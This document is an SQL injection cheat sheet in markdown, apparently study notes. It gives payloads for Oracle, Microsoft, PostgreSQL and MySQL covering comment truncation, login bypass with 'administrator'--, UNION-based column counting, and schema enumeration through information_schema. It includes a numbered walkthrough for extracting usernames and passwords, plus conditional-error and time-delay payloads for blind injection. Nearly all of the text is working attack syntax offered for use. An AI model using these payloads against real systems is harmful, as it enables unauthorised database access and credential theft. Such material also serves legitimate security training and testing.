# SQL cheet sheat

This SQLi cheat sheet contains examples of useful syntax that you can use to perform a variety tasks that often arise when SQL injection attacks.

## Comments

You can use comments to truncate a query and remove the portion of the original query that follows your input

<pre>
<b>Oracle</b>:
		--comment
<b>Microsoft</b>:
		--comment
		/*comment*/
<b>PostgreSQL</b>:
		--comment
		/*comment*/
<b>MySQL</b>:
		#comment
		-- comment (note that the space needs to follow the double dashb)
		/*comment*/
</pre>

***Example***:
```SQL
	SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
	SELECT * FROM products WHERE category = 'football' OR 1=1--' AND released = 1
	SELECT * FROM products WHERE category = 'football'--' AND released = 1
	UNION SELECT username, password FROM users-- 
```

## Database version

<pre>
<b>Oracle</b>:
		SELECT banner FROM v$version
		SELECT version FROM v$instance
<b>Microsoft</b>:
		SELECT @@version
<b>PostgreSQL</b>
		SELECT version()
<b>MySQL</b>:
		SELECT @@version
</pre>

## Number of columns and type of each columns:

If the number of nulls does not match the number of columns, the databas return an error.
```SQL
	UNION SELECT NULL-- (FROM DUAL-- should follow NULL for the injected queries on Oracle )
	UNION SELECT NULL,NULL--
	UNION SELECT NULL,NULL,NULL--
```
OR

This method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs
```SQL
	ORDER BY 1--
	ORDER BY 2--
	ORDER BY 3--
```

After getting the number of comlumns. We can replace`NULL` by `string` or `int` value (i.e: 'abc', 123) to detect the type of data in each column:
```SQL
	UNION SELECT 'abc',NULL,NULL,NULL--
	UNION SELECT NULL,'abc',NULL,NULL--
	UNION SELECT NULL,NULL,123,NULL--
```

## String concatenation

<pre>
<b>Oracle</b>:
		'foo'||'bar'
<b>Microsoft</b>:
		'foo'+'bar'
<b>PostgreSQL</b>:
		'foo'||'bar'
<b>MySQL</b>:
		'foo' 'bar' (the space needs to between the two strings)
		CONCAT('foo','bar')
</pre>

For example:
```SQL
UNION SELECT username || '~' || password FROM users--
```
==> results:
```
...
administrator~password1
user2~password2
user3~password3
...  
```

## Substring

Each of the following expressions will return the string `ba` (Note that the offset index is *1-based*).

<pre>
<b>Oracle</b>:
	SUBSTR('foobar', 4, 2)
<b>Microsoft</b>, <b>PostgreSQL</b>, <b>MySQL</b>:
	SUBSTRING('foobar', 4, 2)
</pre>

## Database contents

You can list the tables that exist in the database, and the columns that those tables contain.

**Oracle**:
```SQL
	SELECT * FROM all_tables
	SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
```
**Microsoft**, **PostgreSQL**, **MySQL**:
```SQL
	SELECT * FROM information_schema.tables
	SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```
Example of SQL injection attack, listing the database content on non-Oracle databases:

```SQL
-- 1. Verify that the qurey is returning two columns, both of which contain text:
UNION SELECT 'abc','def'--
-- 2. Retrieve the list of tables in the database (table_name is found by searching information_chema.table)
UNION SELECT table_name, NULL FROM information_schema.tables--
-- 3. Find the name of the table containing user credentials ==> user_xxx
-- 4. Retrieve the details of the columns in the table
UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='user_xxx'--
-- 5. Find the names of the columns containing usernames and passwords (i.e: username_xxx, password_xxx)
-- 6. Retrieve the usernames and passwords for all
UNION SELECT username_xxx,+password_xxx FROM user_xxx--

```

## Conditional errors

You can test a single boolean condition and trigger a database error if the condition is true

**Oracle**
```SQL
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual
```
**Microsoft**
```SQL
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
```
**PostgreSQL**
```SQL
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END
```
**MySQL**
```SQL
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') 
```

## Time delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

**Oracle** 	
```SQL
dbms_pipe.receive_message(('a'),10)
```
**Microsoft** 	
```SQL
WAITFOR DELAY '0:0:10'
```
**PostgreSQL** 	
```SQL
SELECT pg_sleep(10)
```
**MySQL** 	
```SQL
SELECT sleep(10) 
```
## Conditional time delays

You can test a single boolean condition and trigger a time delay if the condition is true.

**Oracle** 	
```SQL
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
```
**Microsoft** 	
```SQL
IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
```
**PostgreSQL** 	
```SQL
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
```
**MySQL** 	
```SQL
SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')
```

